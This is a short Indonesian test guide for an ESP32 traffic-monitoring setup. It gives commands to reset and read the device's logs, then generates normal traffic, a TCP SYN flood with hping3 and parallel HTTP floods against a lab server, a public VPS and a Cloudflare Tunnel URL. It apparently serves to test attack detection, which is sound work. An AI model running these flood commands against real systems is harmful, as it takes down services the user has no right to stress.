# Command Pengujian Opsi 1

Ganti nilai berikut:

```bash
ESP32=http://IP_ESP32
TARGET=IP_SERVER_TARGET
```

Reset log ESP32:

```bash
curl -u admin:CHANGE_ME -X POST $ESP32/reset
```

Kirim telemetry sintetis:

```bash
python3 tools/send_test_telemetry.py --esp32-url $ESP32 --scenario all --target-ip $TARGET
```

Cek hasil:

```bash
curl -u admin:CHANGE_ME $ESP32/stats.csv
curl -u admin:CHANGE_ME $ESP32/alerts.csv
curl -u admin:CHANGE_ME $ESP32/telemetry.csv
```

Traffic normal ke server target:

```bash
curl -s http://$TARGET:8080 >/dev/null
for i in {1..100}; do curl -s http://$TARGET:8080 >/dev/null; done
```

TCP SYN flood lab:

```bash
hping3 -S -c 500 -i u1000 -p 8080 $TARGET
```

TCP SYN flood publik VPS:

```bash
TARGET=SERVER_PUBLIC_IP
PORT=PUBLIC_TARGET_PORT
sudo hping3 -S -c 500 -i u1000 -p $PORT $TARGET
```

DDoS HTTP flood publik VPS:

```bash
URL=http://SERVER_PUBLIC_IP:8080
seq 1 320 | xargs -P 80 -I{} curl --max-time 10 -s "$URL/?p={}" >/dev/null
```

DDoS HTTP flood via Cloudflare Tunnel jika tidak ada endpoint publik:

```bash
URL=https://URL_TRYCLOUDFLARE
seq 1 320 | xargs -P 80 -I{} curl --max-time 10 -s "$URL/?p={}" >/dev/null
```
